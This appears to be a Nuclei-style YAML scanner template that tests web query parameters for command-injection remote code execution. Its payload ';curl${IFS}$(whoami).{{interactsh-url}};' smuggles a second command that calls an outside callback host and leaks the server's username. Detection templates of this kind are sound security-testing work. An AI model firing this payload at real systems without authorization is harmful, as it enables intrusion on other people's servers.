http:
- fuzzing:
  - fuzz:
    - '{{payload}}'
    mode: single
    part: query
    type: postfix
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  payloads:
    payload:
    - ;curl${IFS}$(whoami).{{interactsh-url}};
  raw:
  - 'GET {{BaseURL}}$ HTTP/1.1

    Host: {{Hostname}}

    '
id: query-rce
info:
  author: roninja
  description: 'This template tests for URI Query Param RCE vulnerability by injecting
    payloads into Query Parameter and detecting interactions via Interactsh. -V iserv=your-interact-hostname

    '
  name: Query - RCE
  reference: https://app.hackinghub.io/hubs/interactive-rce
  severity: critical
  tags: rce, http, injection
